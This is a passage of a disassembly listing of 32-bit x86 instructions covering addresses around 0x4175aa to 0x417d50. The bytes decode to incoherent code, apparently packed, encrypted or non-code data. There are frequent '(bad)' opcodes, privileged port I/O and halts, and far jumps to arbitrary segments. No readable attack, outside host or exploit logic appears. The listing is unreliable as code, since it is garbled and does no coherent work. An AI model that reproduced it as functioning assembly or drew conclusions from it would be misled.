  4175aa:	imul   ebp
  4175ac:	add    bl,BYTE PTR [ecx]
  4175ae:	xchg   esp,eax
  4175af:	fwait
  4175b0:	sub    bl,BYTE PTR [edx+ecx*2-0x12bd9254]
  4175b7:	mov    bh,0xe6
  4175b9:	or     ecx,edx
  4175bb:	and    ch,ch
  4175bd:	adc    ch,bl
  4175bf:	dec    esp
  4175c0:	and    DWORD PTR [edi+eax*2-0x1d7f9540],esp
  4175c7:	out    dx,eax
  4175c8:	nop
  4175c9:	bound  ebp,QWORD PTR [eax-0x6cb3d6b]
  4175cf:	dec    bh
  4175d1:	inc    esp
  4175d2:	mov    edx,0x6e5fa56
  4175d7:	pushf  
  4175d8:	mov    ebp,0xf1299f65
  4175dd:	xchg   ebx,eax
  4175de:	mov    esi,0xa1408407
  4175e3:	mov    edi,0x1c101761
  4175e8:	loope  0x4175d3
  4175ea:	popa   
  4175eb:	arpl   WORD PTR [edi],bp
  4175ed:	dec    edx
  4175ee:	mov    WORD PTR [ecx],es
  4175f0:	lods   eax,DWORD PTR ds:[esi]
  4175f1:	aaa    
  4175f2:	sahf   
  4175f3:	outs   dx,DWORD PTR ds:[esi]
  4175f4:	inc    edx
  4175f5:	jne    0x4175b2
  4175f7:	gs xchg edx,eax
  4175f9:	lock and BYTE PTR gs:[ecx-0x3438be59],cl
  417601:	mov    esp,0xda73479d
  417606:	dec    esi
  417607:	sub    eax,0x36b203e7
  41760c:	mov    esp,0x22d46567
  417611:	sbb    BYTE PTR [edi+esi*4+0x52],cl
  417615:	add    eax,0x2cae0cf4
  41761a:	lock ficom DWORD PTR [ebx+0x41]
  41761e:	out    0xb7,al
  417620:	ror    edx,cl
  417622:	xor    eax,0xc8642320
  417627:	inc    esi
  417628:	mov    ds:0x364d05db,al
  41762d:	test   BYTE PTR [ebx-0xd],0xe6
  417631:	mov    es,WORD PTR [ecx]
  417633:	or     ecx,edi
  417635:	pop    esp
  417636:	and    edi,esp
  417638:	sbb    al,0x1d
  41763a:	jae    0x417693
  41763c:	rcl    DWORD PTR [ebp-0x3fd8e7b0],1
  417642:	pop    ebp
  417643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417644:	pop    esi
  417645:	jo     0x417644
  417647:	mov    bh,BYTE PTR [eax-0x3e]
  41764a:	and    BYTE PTR [ebx+0x1c],dl
  41764d:	enter  0x8904,0xa4
  417651:	fild   QWORD PTR [eax+esi*4]
  417654:	push   ss
  417655:	dec    esp
  417656:	and    esp,ebx
  417658:	ficom  DWORD PTR [edx+esi*2-0x65]
  41765c:	mov    esp,0x69330f23
  417661:	cmc    
  417662:	push   ecx
  417663:	sub    BYTE PTR [esi-0x6f2732a5],dh
  417669:	pop    ss
  41766a:	push   0x6fe9f064
  41766f:	bound  edi,QWORD PTR [esi]
  417671:	xchg   ebp,eax
  417672:	lods   eax,DWORD PTR ds:[esi]
  417673:	sub    al,ch
  417675:	(bad)  
  417676:	dec    BYTE PTR [edx+0x1eaf23e3]
  41767c:	cmc    
  41767d:	sub    BYTE PTR [edx-0x18],ch
  417680:	jnp    0x41762e
  417682:	mov    BYTE PTR [ebx],dl
  417684:	xchg   ebp,eax
  417685:	inc    esp
  417686:	xor    al,BYTE PTR [eax+0x5b58c240]
  41768c:	scas   eax,DWORD PTR es:[edi]
  41768d:	pop    esp
  41768e:	jmp    0x51d7:0x26ed1518
  417695:	in     eax,dx
  417696:	jbe    0x417664
  417698:	push   esi
  417699:	or     eax,0x37b3df1f
  41769e:	fadd   DWORD PTR [edi+eax*8-0x1707931]
  4176a5:	addr16 pop ecx
  4176a7:	mov    eax,0x95a0154f
  4176ac:	cli    
  4176ad:	mov    ebx,0x74b3ffd9
  4176b2:	hlt    
  4176b3:	fs out 0x2d,al
  4176b6:	jl     0x41768c
  4176b8:	retf   0xc3fc
  4176bb:	push   esi
  4176bc:	push   0xf40fa9a0
  4176c1:	imul   edi,DWORD PTR [ebx],0x6ce7eacb
  4176c7:	inc    ecx
  4176c8:	sti    
  4176c9:	ja     0x417714
  4176cb:	cli    
  4176cc:	jnp    0x4176d4
  4176ce:	ins    DWORD PTR es:[edi],dx
  4176cf:	sub    eax,0xe154d9e3
  4176d4:	pop    ebp
  4176d5:	inc    ebp
  4176d6:	pop    ebp
  4176d7:	cmp    eax,0x8f66a152
  4176dc:	and    eax,DWORD PTR [edx+esi*4-0x28]
  4176e0:	pop    edi
  4176e1:	or     BYTE PTR [eax],dl
  4176e3:	xor    ecx,DWORD PTR [ebp-0x1d8b8794]
  4176e9:	es popa 
  4176eb:	(bad)  
  4176ec:	jmp    0x69218544
  4176f1:	in     eax,0xc0
  4176f3:	into   
  4176f4:	xchg   ebx,eax
  4176f5:	je     0x4176d8
  4176f7:	push   cs
  4176f8:	push   0x3c
  4176fa:	xor    eax,edi
  4176fc:	xchg   DWORD PTR [edx*4-0x40ce7c30],eax
  417703:	mov    ch,0x94
  417705:	lods   al,BYTE PTR ds:[esi]
  417706:	sub    DWORD PTR [ecx+0x4d],0x7c158594
  41770d:	ret    
  41770e:	fimul  DWORD PTR [edx]
  417710:	std    
  417711:	aad    0x48
  417713:	loope  0x41778e
  417715:	loopne 0x417749
  417717:	retf   0x7622
  41771a:	push   0x1a826fbf
  41771f:	div    BYTE PTR [edi]
  417721:	daa    
  417722:	xchg   ebp,eax
  417723:	sbb    al,0xc7
  417725:	cmp    al,0xa6
  417727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417728:	and    DWORD PTR [esi],edx
  41772a:	out    0x79,eax
  41772c:	outs   dx,DWORD PTR ds:[esi]
  41772d:	dec    ebp
  41772e:	popa   
  41772f:	daa    
  417730:	adc    al,0x10
  417732:	xchg   ecx,eax
  417733:	push   edi
  417734:	adc    dl,bl
  417736:	(bad)  
  417738:	arpl   di,bx
  41773a:	loopne 0x417770
  41773c:	fnstcw WORD PTR [ebp-0x11]
  41773f:	int    0x35
  417741:	mov    ebp,0xb8db77cc
  417746:	mov    edi,0xc34645d4
  41774b:	shl    eax,1
  41774d:	add    BYTE PTR [esi+edx*2],dl
  417750:	jo     0x41775d
  417752:	(bad)  
  417753:	cmp    eax,0xe62a0c2a
  417758:	call   0xd67f:0x4a02c4fd
  41775f:	ins    BYTE PTR es:[edi],dx
  417760:	add    BYTE PTR [ebx-0x55],dl
  417763:	push   0xffffffbb
  417765:	test   DWORD PTR [ecx+0x428e1b3d],ecx
  41776b:	jne    0x4176f6
  41776d:	out    0x6a,al
  41776f:	sbb    al,0xf2
  417771:	fisub  DWORD PTR [ebp-0x66696262]
  417777:	clc    
  417778:	es loop 0x4177d2
  41777b:	jmp    0x417760
  41777d:	add    al,0xac
  41777f:	lds    esi,FWORD PTR [ebp+0x2e]
  417782:	(bad)  
  417784:	adc    DWORD PTR [edi+0x29f3c725],ebp
  41778a:	enter  0x352d,0x31
  41778e:	add    dl,0xc1
  417791:	sahf   
  417792:	call   0x60a5:0x6aa176ab
  417799:	push   es
  41779a:	out    0x77,al
  41779c:	cmp    ecx,0xffffffff
  41779f:	inc    esi
  4177a0:	mov    gs,WORD PTR [edi]
  4177a2:	and    DWORD PTR [eax+0xdb59b1e],ebx
  4177a8:	mov    ebp,0x16522559
  4177ad:	cmp    ch,BYTE PTR [esi]
  4177af:	hlt    
  4177b0:	imul   ebx,DWORD PTR [ebp-0x4],0xd0f374ab
  4177b7:	movaps XMMWORD PTR [edi-0x33],xmm3
  4177bb:	stos   BYTE PTR es:[edi],al
  4177bc:	std    
  4177bd:	add    BYTE PTR [ebx-0x5],dl
  4177c0:	jbe    0x4177ab
  4177c2:	mov    ah,0x23
  4177c4:	xchg   BYTE PTR [ecx-0x44],dh
  4177c7:	push   ds
  4177c8:	dec    esi
  4177c9:	outs   dx,DWORD PTR ds:[esi]
  4177ca:	cmp    edi,eax
  4177cc:	pop    ebx
  4177cd:	out    dx,al
  4177ce:	cli    
  4177cf:	push   ds
  4177d0:	sub    eax,0x7601535c
  4177d5:	in     al,dx
  4177d6:	sar    DWORD PTR [edi],1
  4177d8:	pop    ebx
  4177d9:	jp     0x417769
  4177db:	mov    ebx,0xfbedd4ce
  4177e0:	stc    
  4177e1:	and    DWORD PTR [eax-0x4e],esi
  4177e4:	add    esp,ebp
  4177e6:	fst    QWORD PTR [edi-0x24]
  4177e9:	jg     0x4177b6
  4177eb:	(bad)  
  4177ec:	(bad)
  4177ef:	pop    eax
  4177f0:	pop    esi
  4177f1:	and    edx,edx
  4177f3:	mov    ebx,0x97096ecb
  4177f8:	aad    0xb4
  4177fa:	jno    0x4177d6
  4177fc:	pop    ebx
  4177fd:	pop    edi
  4177fe:	jbe    0x417789
  417800:	data16 cld 
  417802:	inc    esi
  417803:	adc    al,0x4b
  417805:	xor    ah,BYTE PTR [esp+eax*8+0x50888d85]
  41780c:	outs   dx,BYTE PTR ds:[esi]
  41780d:	sub    DWORD PTR [ebx],0xffffffde
  417810:	jge    0x4177a7
  417812:	fwait
  417813:	leave  
  417814:	xchg   esp,eax
  417815:	mov    bl,0xec
  417817:	repz (bad) 
  417819:	sbb    ebp,DWORD PTR [ecx+edx*2-0x16]
  41781d:	clc    
  41781e:	outs   dx,DWORD PTR ds:[esi]
  41781f:	inc    esi
  417820:	cmp    eax,0xa3f27614
  417825:	test   DWORD PTR [edx-0xb50500c],ebx
  41782b:	in     al,0x52
  41782d:	mov    ds:0xd62013d,eax
  417832:	shr    BYTE PTR [esi+0x52],0x50
  417836:	xor    bl,BYTE PTR [edi-0x4825693]
  41783c:	dec    ebp
  41783d:	inc    esi
  41783e:	and    DWORD PTR [edi-0x28],ecx
  417841:	int3   
  417842:	mov    dh,0x78
  417844:	fisub  WORD PTR [ebx]
  417846:	cli    
  417847:	mov    cl,0x9d
  417849:	and    bh,BYTE PTR [edx+edx*1]
  41784c:	(bad)  
  41784d:	or     DWORD PTR [esi-0x42],edi
  417850:	add    ebx,DWORD PTR ds:0xa7f1bd7a
  417856:	daa    
  417857:	jbe    0x417811
  417859:	xor    ebp,DWORD PTR [esi-0x3]
  41785c:	jmp    0x4178aa
  41785e:	sbb    eax,DWORD PTR [ebp+0x8]
  417861:	ins    BYTE PTR es:[edi],dx
  417862:	xchg   ebp,eax
  417863:	pop    esp
  417864:	cdq    
  417865:	mov    ss:0xe289e8e2,eax
  41786b:	retf   
  41786c:	adc    ebp,DWORD PTR [eax]
  41786e:	aas    
  41786f:	xlat   BYTE PTR ds:[ebx]
  417870:	ret    0x91ec
  417873:	cmp    BYTE PTR [ebp-0x50],ah
  417876:	inc    ebx
  417877:	push   0xffffff87
  417879:	vpsubusb ymm4,ymm3,YMMWORD PTR [ebx]
  41787d:	push   0xffffffcf
  41787f:	mov    edx,0xfd6d2f58
  417884:	fisttp QWORD PTR [edi+eax*1-0x62]
  417888:	mov    ds:0x70a8972d,al
  41788d:	outs   dx,DWORD PTR ds:[esi]
  41788e:	in     eax,0xc4
  417890:	inc    edi
  417891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417892:	popa   
  417893:	shl    DWORD PTR [esi+edx*1+0x320ba79c],1
  41789a:	adc    ah,ah
  41789c:	mov    esi,0x2a2f9dd4
  4178a1:	pop    edi
  4178a2:	pop    eax
  4178a3:	pop    ecx
  4178a4:	nop
  4178a5:	jnp    0x4178b6
  4178a7:	cs and al,0x4e
  4178aa:	aad    0x74
  4178ac:	add    al,0x8
  4178ae:	pop    es
  4178af:	cld    
  4178b0:	(bad)  
  4178b1:	out    dx,al
  4178b2:	inc    eax
  4178b3:	pop    ebp
  4178b4:	jno    0x4178ba
  4178b6:	mov    eax,ds:0xaefd49d3
  4178bb:	xchg   edx,eax
  4178bc:	jnp    0x4178fd
  4178be:	je     0x79a48706
  4178c4:	add    edx,DWORD PTR [eax-0x5160999c]
  4178ca:	sub    DWORD PTR [edi-0x40],ebx
  4178cd:	push   es
  4178ce:	lods   eax,DWORD PTR ds:[esi]
  4178cf:	add    bl,BYTE PTR [ebx+0x71]
  4178d2:	es pause 
  4178d5:	nop
  4178d6:	js     0x417945
  4178d8:	pop    eax
  4178d9:	fs pop ds
  4178db:	xchg   bl,al
  4178dd:	call   FWORD PTR [ebx-0x15bdfd96]
  4178e3:	icebp  
  4178e4:	in     eax,0x64
  4178e6:	push   ebp
  4178e7:	daa    
  4178e8:	das    
  4178e9:	int    0x7e
  4178eb:	or     BYTE PTR [ebp-0x60],dl
  4178ee:	mov    eax,0x93792d52
  4178f3:	cdq    
  4178f4:	pminsw mm1,mm2
  4178f7:	dec    eax
  4178f8:	and    eax,esi
  4178fa:	fbstp  TBYTE PTR [edx-0x298917b0]
  417900:	mov    ecx,0x3678fce
  417905:	stos   BYTE PTR es:[edi],al
  417906:	adc    eax,0x2bd314f8
  41790b:	push   ebp
  41790c:	push   esp
  41790d:	pop    esp
  41790e:	dec    eax
  41790f:	fdivr  QWORD PTR [ebp+0x29]
  417912:	popf   
  417913:	dec    esi
  417914:	mov    bh,0xd8
  417916:	or     DWORD PTR [ecx+0x6a7dcd65],ebp
  41791c:	out    dx,eax
  41791d:	jl     0x4178ea
  41791f:	mov    ah,al
  417921:	inc    esp
  417922:	xor    eax,0x1175e15
  417927:	mov    eax,0xa04156ce
  41792c:	jbe    0x4178bf
  41792e:	xchg   edi,eax
  41792f:	addr16 inc esi
  417931:	xchg   ecx,eax
  417932:	and    bh,BYTE PTR [di]
  417935:	stc    
  417936:	mov    al,0x9e
  417938:	lock sub ah,BYTE PTR [ecx+0x3df5f7fa]
  41793f:	or     eax,0x7c2aeab
  417944:	cmp    DWORD PTR [esi+0x4e11da6c],ebp
  41794a:	adc    ecx,ebx
  41794c:	call   0x8703:0x67ea7
  417953:	sub    DWORD PTR [edi],edx
  417955:	in     eax,0x27
  417957:	sub    ebp,ecx
  417959:	gs jo  0x41790d
  41795c:	lahf   
  41795d:	cwde   
  41795e:	push   0x47
  417960:	or     bl,al
  417962:	cmc    
  417963:	addr16 or al,0x82
  417966:	out    dx,al
  417967:	push   ebp
  417968:	les    edx,FWORD PTR [esi]
  41796a:	pop    es
  41796b:	mov    esi,0x36412088
  417970:	sbb    BYTE PTR [ebp+0x6277cc7],bh
  417976:	ret    
  417977:	out    0x9c,al
  417979:	ror    DWORD PTR [ecx+0x128b5eea],1
  41797f:	jne    0x417962
  417981:	call   0x4304:0x63f49034
  417988:	cwde   
  417989:	enter  0x4cef,0xbc
  41798d:	push   ecx
  41798e:	in     al,0xc6
  417990:	popf   
  417991:	add    DWORD PTR [edi+eax*8+0x25109871],edx
  417998:	not    DWORD PTR [eax-0x75e7f0e9]
  41799e:	cmc    
  41799f:	das    
  4179a0:	mov    al,0x97
  4179a2:	aam    0x8b
  4179a4:	mov    al,0xb5
  4179a6:	adc    BYTE PTR [edx-0x30],0x5c
  4179aa:	int3   
  4179ab:	(bad)  
  4179ac:	pop    eax
  4179ad:	pop    edi
  4179ae:	fld    TBYTE PTR [ecx-0x2c]
  4179b1:	enter  0x659d,0xa0
  4179b5:	push   ebp
  4179b6:	inc    ebx
  4179b7:	dec    edi
  4179b8:	neg    esi
  4179ba:	(bad)  
  4179bb:	cmp    bl,cl
  4179bd:	ss xor al,0x83
  4179c0:	pop    eax
  4179c1:	scas   eax,DWORD PTR es:[edi]
  4179c2:	(bad)  
  4179c3:	push   es
  4179c4:	fwait
  4179c5:	mov    WORD PTR [eax+eiz*2+0x5f4b20be],cs
  4179cc:	arpl   WORD PTR [ecx+0x40],si
  4179cf:	sti    
  4179d0:	sbb    eax,0x3a36b6d
  4179d5:	imul   esp,eax,0xffffffb7
  4179d8:	arpl   WORD PTR [esp+ebx*8-0x655eef07],bx
  4179df:	popf   
  4179e0:	jmp    0xc041b5c0
  4179e5:	jp     0x417a13
  4179e7:	sub    DWORD PTR ds:0xdd635795,esi
  4179ed:	and    esi,DWORD PTR [edx-0x3c884fe0]
  4179f3:	inc    ebp
  4179f4:	ret    
  4179f5:	fist   DWORD PTR [edx+eiz*2+0x373ffc78]
  4179fc:	add    DWORD PTR [eax],eax
  4179fe:	fidiv  WORD PTR [esi-0x4d108a13]
  417a04:	retf   0xa604
  417a07:	xlat   BYTE PTR ds:[ebx]
  417a08:	inc    ebp
  417a09:	inc    BYTE PTR [ecx]
  417a0b:	leave  
  417a0c:	fsub   DWORD PTR ds:0x8fc3770b
  417a12:	(bad)  
  417a13:	fsub   DWORD PTR [eax-0x706aa283]
  417a19:	inc    edx
  417a1a:	push   ds
  417a1b:	and    edx,DWORD PTR [edx-0x67]
  417a1e:	icebp  
  417a1f:	call   0xe74f6f0f
  417a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a25:	(bad)  
  417a26:	sbb    ecx,edi
  417a28:	cwde   
  417a29:	pop    ds
  417a2a:	jle    0x417a53
  417a2c:	imul   esi,ebp,0xfffffff1
  417a2f:	in     eax,dx
  417a30:	(bad)  
  417a31:	adc    al,0xe2
  417a33:	cmp    bl,cl
  417a35:	inc    ecx
  417a36:	fstp   QWORD PTR [ecx-0x30]
  417a39:	inc    esi
  417a3a:	nop
  417a3b:	push   ebx
  417a3c:	js     0x417a26
  417a3e:	pop    esi
  417a3f:	shl    esi,cl
  417a41:	ja     0x417ab3
  417a43:	out    dx,al
  417a44:	scas   al,BYTE PTR es:[edi]
  417a45:	out    0xa6,al
  417a47:	dec    ecx
  417a48:	fwait
  417a49:	or     DWORD PTR [edi],ebx
  417a4b:	pushw  0x87d8
  417a4f:	push   ss
  417a50:	jp     0x417a90
  417a52:	pop    ecx
  417a53:	call   0x55c93d98
  417a58:	scas   al,BYTE PTR es:[edi]
  417a59:	stos   BYTE PTR es:[edi],al
  417a5a:	adc    edx,esi
  417a5c:	lods   al,BYTE PTR ds:[esi]
  417a5d:	scas   al,BYTE PTR es:[edi]
  417a5e:	int    0x9d
  417a60:	mov    cl,0xfe
  417a62:	fist   WORD PTR [edx+0x9]
  417a65:	ss or  eax,0x4cf8800b
  417a6b:	lds    ecx,FWORD PTR [ecx-0x3b]
  417a6e:	mov    WORD PTR [ecx+0x1f],es
  417a71:	inc    ecx
  417a72:	test   al,0x15
  417a75:	jge    0x417a09
  417a77:	or     ch,BYTE PTR [ebx+0xf340f96]
  417a7d:	loopne 0x417a02
  417a7f:	sbb    DWORD PTR [eax],eax
  417a81:	jae    0x417afd
  417a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a84:	inc    esi
  417a85:	mov    BYTE PTR [edi-0x6c],bl
  417a88:	in     eax,dx
  417a89:	enter  0x2ece,0x3c
  417a8d:	dec    ecx
  417a8e:	push   ecx
  417a8f:	enter  0x7ff5,0x32
  417a93:	test   al,0x28
  417a95:	cli    
  417a96:	pop    ecx
  417a97:	sub    DWORD PTR [edi+edi*4],edx
  417a9a:	and    DWORD PTR [esi+0x29],ebp
  417a9d:	loopne 0x417b0c
  417a9f:	pushw  ss
  417aa1:	sub    BYTE PTR [edx],al
  417aa3:	bound  esi,QWORD PTR [eax-0x6]
  417aa6:	cmp    al,BYTE PTR [ecx-0x5f]
  417aa9:	inc    eax
  417aaa:	ins    DWORD PTR es:[edi],dx
  417aab:	xchg   edi,eax
  417aac:	lahf   
  417aad:	in     eax,0x2a
  417aaf:	fcomi  st,st(6)
  417ab1:	scas   eax,DWORD PTR es:[edi]
  417ab2:	cmc    
  417ab3:	pop    ss
  417ab4:	test   DWORD PTR [edx+0x636dc05e],0x580e44b6
  417abe:	and    DWORD PTR [edx-0x7d],esp
  417ac1:	std    
  417ac2:	imul   esi,DWORD PTR [edx],0x764b6d83
  417ac8:	test   eax,0x62f85d0c
  417acd:	shl    ah,cl
  417acf:	adc    ebx,eax
  417ad1:	and    ecx,DWORD PTR [edi+0xf190fcc]
  417ad7:	pop    ss
  417ad8:	add    cl,dh
  417ada:	cmp    al,0x78
  417adc:	lods   al,BYTE PTR ds:[esi]
  417add:	push   cs
  417ade:	push   eax
  417adf:	loop   0x417b5a
  417ae1:	sbb    DWORD PTR [ebx],ecx
  417ae3:	loopne 0x417abd
  417ae5:	cmp    DWORD PTR [ecx-0x5f6eff53],eax
  417aeb:	repz test eax,0xdca87518
  417af1:	test   al,0x29
  417af3:	xchg   edi,eax
  417af4:	hlt    
  417af5:	sub    al,0x25
  417af7:	pop    es
  417af8:	ret    
  417af9:	jbe    0x417b0f
  417afb:	and    BYTE PTR [esi+0x2f],cl
  417afe:	enter  0x7c44,0x46
  417b02:	hlt    
  417b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b04:	std    
  417b05:	pop    ecx
  417b06:	jmp    0x417ae4
  417b08:	cld    
  417b09:	cmp    DWORD PTR ds:0x8d78bafa,esp
  417b0f:	cmc    
  417b10:	and    al,0x58
  417b12:	cmp    eax,0x8c34f02e
  417b17:	fcmovnu st,st(3)
  417b19:	popf   
  417b1a:	sub    DWORD PTR [edx-0xe],eax
  417b1d:	out    dx,al
  417b1e:	jmp    0x417b5e
  417b20:	inc    esp
  417b21:	out    dx,eax
  417b22:	push   edi
  417b23:	inc    esp
  417b24:	push   ds
  417b25:	cmp    DWORD PTR [edi],esi
  417b27:	inc    ecx
  417b28:	inc    esi
  417b29:	dec    edx
  417b2a:	and    BYTE PTR [esi-0x36bfa25b],bl
  417b30:	test   al,0xd0
  417b32:	sar    BYTE PTR [ebx-0x42cf5ff4],0x71
  417b39:	cmp    edx,esi
  417b3b:	std    
  417b3c:	fild   WORD PTR [esi+0x7c]
  417b3f:	not    DWORD PTR [edx-0x466b601e]
  417b45:	dec    edi
  417b46:	push   ebp
  417b47:	ror    DWORD PTR [edx+0x74],cl
  417b4a:	and    ebp,DWORD PTR [ebx+0x0]
  417b4d:	retf   
  417b4e:	sub    bl,BYTE PTR [ecx]
  417b50:	jle    0x417b68
  417b52:	test   bh,bl
  417b54:	ins    BYTE PTR es:[edi],dx
  417b55:	adc    BYTE PTR [ecx],ch
  417b57:	sub    dl,dl
  417b59:	sti    
  417b5a:	and    eax,0x6ba48727
  417b5f:	stc    
  417b60:	cmp    ch,dh
  417b62:	inc    edi
  417b63:	add    al,0x75
  417b65:	data16 mov bl,0x90
  417b68:	data16 das 
  417b6a:	outs   dx,BYTE PTR ds:[esi]
  417b6b:	xchg   ebp,eax
  417b6c:	js     0x417b99
  417b6e:	jmp    0xdb5:0x5e03e2fe
  417b75:	mov    ss,WORD PTR gs:[esi+0x28]
  417b79:	movlps xmm4,QWORD PTR [esi-0x198fe270]
  417b80:	inc    ebp
  417b81:	sbb    al,0x9
  417b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b84:	pop    ebp
  417b85:	inc    DWORD PTR [ecx+edx*8]
  417b88:	imul   DWORD PTR [eax]
  417b8a:	mov    WORD PTR [ebx+ebx*2+0x783f2a25],?
  417b91:	arpl   sp,si
  417b93:	(bad)  
  417b94:	data16 fdivp st(2),st
  417b98:	pop    esp
  417b99:	push   eax
  417b9a:	push   ss
  417b9b:	dec    edx
  417b9c:	cmp    ebp,DWORD PTR [esi+0x42]
  417b9f:	into   
  417ba0:	jle    0x417b30
  417ba2:	jecxz  0x417bae
  417ba4:	sub    dh,dl
  417ba6:	enter  0xa129,0x9b
  417baa:	and    al,0x68
  417bac:	xor    al,0x60
  417bae:	fst    st(2)
  417bb0:	inc    edx
  417bb1:	fisttp WORD PTR [edx+0x61d83341]
  417bb7:	out    dx,al
  417bb8:	pushf  
  417bb9:	in     al,0xbd
  417bbb:	jmp    0xe4a9fc65
  417bc0:	hlt    
  417bc1:	mov    eax,DWORD PTR [edx]
  417bc3:	mov    ds:0xd547ebd8,al
  417bc8:	loop   0x417b6e
  417bca:	(bad)  
  417bcb:	stos   DWORD PTR es:[edi],eax
  417bcc:	jne    0x417b53
  417bce:	dec    eax
  417bcf:	ins    DWORD PTR es:[edi],dx
  417bd0:	lock mov esi,0x851920a7
  417bd6:	imul   BYTE PTR [ebp+0x7b]
  417bd9:	fistp  WORD PTR [edi-0x2f]
  417bdc:	shr    BYTE PTR [edx],0xa1
  417bdf:	out    dx,eax
  417be0:	addr16 mov dh,0x34
  417be3:	(bad)  
  417be6:	retf   
  417be7:	dec    esp
  417be8:	xor    al,0x8a
  417bea:	push   eax
  417beb:	fidivr DWORD PTR [ebp+0x52]
  417bee:	cli    
  417bef:	loop   0x417ba5
  417bf1:	mov    ebx,0xa8515623
  417bf6:	mov    ebp,0x3c556de8
  417bfb:	cmp    DWORD PTR ds:0x4ec549cf,ecx
  417c01:	sahf   
  417c02:	and    al,BYTE PTR [eax-0x792a4fd3]
  417c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c09:	rol    DWORD PTR [esi],0xaa
  417c0c:	pop    esp
  417c0d:	mov    fs,ebp
  417c0f:	shl    DWORD PTR [eax],cl
  417c11:	faddp  st(7),st
  417c13:	push   edi
  417c14:	add    eax,0x4abed5be
  417c19:	int    0x62
  417c1b:	(bad)
  417c1e:	jg     0x417c88
  417c20:	repnz adc edx,DWORD PTR [eax+0x55]
  417c24:	dec    edx
  417c25:	pusha  
  417c26:	mov    bh,0xd9
  417c28:	pop    ebp
  417c29:	in     al,dx
  417c2a:	pop    edi
  417c2b:	xchg   ecx,eax
  417c2c:	jmp    0xd73a8893
  417c31:	(bad)  
  417c32:	and    al,0xa0
  417c34:	in     al,dx
  417c35:	fwait
  417c36:	push   esp
  417c37:	fist   DWORD PTR [ebp+0x59]
  417c3a:	inc    ebx
  417c3b:	sbb    eax,0xc86e556a
  417c40:	pop    eax
  417c41:	retf   
  417c42:	sub    BYTE PTR [ecx],0xcc
  417c45:	or     BYTE PTR [edx-0x136d82c8],ah
  417c4b:	sbb    al,0x7
  417c4d:	aas    
  417c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c4f:	in     al,dx
  417c50:	sbb    esi,esp
  417c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c53:	and    edi,0xffffffd3
  417c56:	dec    ebp
  417c57:	cdq    
  417c58:	fs cmc 
  417c5a:	imul   ebx,esi,0x6
  417c5d:	in     al,dx
  417c5e:	sbb    bl,BYTE PTR [ecx]
  417c60:	dec    eax
  417c61:	shr    BYTE PTR [edx+0x5644204e],cl
  417c67:	push   edi
  417c68:	int    0xf8
  417c6a:	ret    0xe9b9
  417c6d:	or     DWORD PTR [edi],esi
  417c6f:	mov    edi,0x6cead078
  417c74:	adc    esi,DWORD PTR [edx+0x5c]
  417c77:	mul    DWORD PTR [ebx+0x77801d03]
  417c7d:	enter  0x32e0,0x86
  417c81:	jo     0x417cff
  417c83:	mov    eax,0xb838f145
  417c88:	jp     0x417c58
  417c8a:	sahf   
  417c8b:	xor    edi,esi
  417c8d:	cs aad 0xe5
  417c90:	mov    ebp,0x96d24d6b
  417c95:	inc    esp
  417c96:	mov    edx,0xabeed8a8
  417c9b:	fcom   DWORD PTR [edi-0x498f454d]
  417ca1:	xchg   ebx,eax
  417ca2:	inc    ebp
  417ca3:	cmp    eax,DWORD PTR [esi+0x38]
  417ca6:	iret   
  417ca7:	adc    al,0xf
  417ca9:	xchg   ebp,eax
  417caa:	push   ebp
  417cab:	pop    ss
  417cac:	jge    0x417c79
  417cae:	and    eax,0x8024d784
  417cb3:	add    eax,0x9650a815
  417cb8:	ret    
  417cb9:	xor    eax,0x3416586
  417cbe:	stos   BYTE PTR es:[edi],al
  417cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cc0:	and    DWORD PTR [ebp+0x25],esi
  417cc3:	lods   al,BYTE PTR ds:[esi]
  417cc4:	xor    edx,DWORD PTR [ecx+0x63d1ed13]
  417cca:	out    dx,al
  417ccb:	sahf   
  417ccc:	stos   BYTE PTR es:[edi],al
  417ccd:	push   ss
  417cce:	retf   0xdb4e
  417cd1:	mov    edi,0x22f745b3
  417cd6:	or     BYTE PTR [edx],dl
  417cd8:	popf   
  417cd9:	lahf   
  417cda:	jae    0x417cd4
  417cdc:	sbb    eax,0xa822f95a
  417ce1:	popa   
  417ce2:	loop   0x417d03
  417ce4:	push   cs
  417ce5:	popf   
  417ce6:	adc    dh,BYTE PTR [ebp+edx*4+0x62]
  417cea:	out    0xbc,eax
  417cec:	in     eax,0xa8
  417cee:	aam    0x98
  417cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf1:	sar    bl,0x88
  417cf4:	pop    ebp
  417cf5:	sti    
  417cf6:	jb     0x417d55
  417cf8:	pop    ecx
  417cf9:	jb     0x417c92
  417cfb:	inc    esi
  417cfc:	nop
  417cfd:	cs inc edi
  417cff:	adc    BYTE PTR [eax+0x3b4be5ed],bh
  417d05:	or     DWORD PTR [ecx-0x63ed330c],esi
  417d0b:	pop    ebp
  417d0c:	ins    DWORD PTR es:[edi],dx
  417d0d:	bound  edi,QWORD PTR [edx]
  417d0f:	arpl   WORD PTR [ecx+ecx*1-0x6da3ff50],ax
  417d16:	shl    BYTE PTR [esi],1
  417d18:	or     al,0x10
  417d1b:	jmp    0x417d76
  417d1d:	mov    esi,0x8b608a45
  417d22:	dec    eax
  417d23:	idiv   BYTE PTR [edi]
  417d25:	push   edi
  417d26:	aaa    
  417d27:	stos   BYTE PTR es:[edi],al
  417d28:	push   ax
  417d2a:	push   eax
  417d2b:	pop    eax
  417d2c:	(bad)  
  417d2d:	clc    
  417d2e:	cwde   
  417d2f:	and    eax,0x9de0708d
  417d34:	ffreep st(7)
  417d36:	mov    esi,0x257911a5
  417d3b:	mov    eax,ds:0x4241b729
  417d40:	retf   0x5af0
  417d43:	pop    edx
  417d44:	jge    0x417d59
  417d46:	cmp    edi,ebp
  417d48:	(bad)  
  417d49:	mov    eax,0x5dea1b6d
  417d4e:	push   ds
  417d4f:	xchg   ebx,eax
  417d50:	in     al,dx
